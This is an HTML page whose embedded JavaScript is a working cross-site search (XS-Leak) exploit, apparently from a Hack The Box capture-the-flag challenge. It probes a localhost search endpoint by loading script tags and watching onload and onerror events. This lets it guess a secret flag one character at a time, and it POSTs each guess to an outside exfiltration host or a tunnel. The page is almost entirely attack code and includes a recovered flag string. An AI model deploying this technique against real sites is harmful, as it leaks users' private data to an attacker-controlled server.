<html>
    <head></head>
    <body>
        <script>
            const target = 'http://127.0.0.1:1337/api/entries/search?q='
            // const proxy = 'http://172.17.0.1:8888/'
            const proxy = 'http://bore.pub:35383'
            const exfil = 'http://o35xd798.requestrepo.com'
            const flag_charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567890~!@$^()+=-{}[]\|;:,./?<>_'

            async function load_resource(target, flag, char_index) {
                return new Promise((resolve, reject) => {
                    var resource_element = document.createElement('script')
                    const flag_hypothesis = flag + flag_charset.slice(char_index, char_index+1)
                    console.log(flag_hypothesis)
                    console.log(char_index)
                    resource_element.src = target + flag_hypothesis
                    resource_element.onload = () => resolve(flag_hypothesis)
                    resource_element.onerror = () => reject()
                    document.head.appendChild(resource_element)
                })
            }

            async function proxy_resource(target, flag, char_index) {
                return new Promise((resolve, reject) => {
                    const flag_hypothesis = flag + flag_charset.slice(char_index, char_index+1)
                    fetch(cors_proxy + target + flag_hypothesis)
                        .then(() => resolve(flag_hypothesis))
                        .catch(() => reject())
                })
            }
            
            async function get_flag(target, flag, index, exfil) {
                await load_resource(target, flag, index)
                    .then((res) => {
                        get_flag(target, res, 0, exfil)
                        fetch(exfil, {method: 'POST', body: res})
                    })
                    .catch(() => {
                        if (flag_charset.slice(index+1) == '') {
                            fetch(exfil, {method: 'POST', body: flag})
                        } else {
                            get_flag(target, flag, index+1, exfil)
                        }
                    })
            }

            // get_flag(target, 'HTB', 0, exfil)
            // get_flag(target, 'HTB', 0, proxy)
            // get_flag(target, 'HTB{5w33t_ali3nd', 0, proxy)
            get_flag(target, 'HTB{5w33t_ali3ndr3n_0f_min3!}', 0, proxy)
        </script>
    </body>
</html>
